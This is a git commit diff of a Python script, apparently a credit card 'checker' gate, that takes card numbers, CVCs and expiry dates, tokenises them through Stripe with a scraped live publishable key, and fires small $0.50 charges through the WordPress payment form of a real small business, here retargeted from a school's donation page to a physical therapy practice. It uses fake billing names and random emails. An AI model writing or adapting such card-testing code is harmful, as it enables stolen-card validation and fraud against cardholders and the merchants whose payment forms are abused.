0d51e53cc174890e5a718dc0df0cc5eec84f15e5
nomi924500-sudo <nomi924500@gmail.com>
2026-02-07 20:57:22 +0630

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -29,51 +29,45 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&billing_details[name]=Sioo&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F1239285b29%3B+stripe-js-v3%2F1239285b29%3B+card-element&key=pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'
+	data = f'type=card&billing_details[name]=Sioo&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA=number&payment_user_agent=stripe.js%2F3233cbd46e%3B+stripe-js-v3%2F3233cbd46e%3B+card-element&key=pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'texassouthernacademy.com',
-	    'accept': 'application/json, text/javascript, */*; q=0.01',
-	    'accept-language': 'en-US,en;q=0.9',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://texassouthernacademy.com',
-	    'referer': 'https://texassouthernacademy.com/donation/',
+	    'Accept': 'application/json, text/javascript, */*; q=0.01',
+	    'Accept-Language': 'en-US,en;q=0.9',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'Origin': 'https://farmingdalephysicaltherapywest.com',
+	    'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
 	data = {
-	    'action': 'wp_full_stripe_inline_donation_charge',
-	    'wpfs-form-name': 'donate',
+	    'action': 'wp_full_stripe_inline_payment_charge',
+	    'wpfs-form-name': 'Payment-Form',
 	    'wpfs-form-get-parameters': '%7B%7D',
-	    'wpfs-custom-amount': 'other',
 	    'wpfs-custom-amount-unique': '0.50',
-	    'wpfs-donation-frequency': 'one-time',
-	    'wpfs-billing-name': 'Yan',
-	    'wpfs-billing-address-country': 'US',
-	    'wpfs-billing-address-line-1': '7246 Royal Ln',
-	    'wpfs-billing-address-line-2': '',
-	    'wpfs-billing-address-city': 'Bellevue',
-	    'wpfs-billing-address-state': '',
-	    'wpfs-billing-address-state-select': 'NY',
-	    'wpfs-billing-address-zip': '10080',
+	    'wpfs-custom-input[]': 'Yan',
 	    'wpfs-card-holder-email': f'Sioo{random_amount1}{random_amount2}@gmail.com',
 	    'wpfs-card-holder-name': 'Sioo',
 	    'wpfs-stripe-payment-method-id': f'{pm}',
 	}
 	
-	response = requests.post('https://texassouthernacademy.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post(
+	    'https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php',
+	    headers=headers,
+	    data=data,
+	)
 	
 	result = response.json()['message']
-	
 	return result
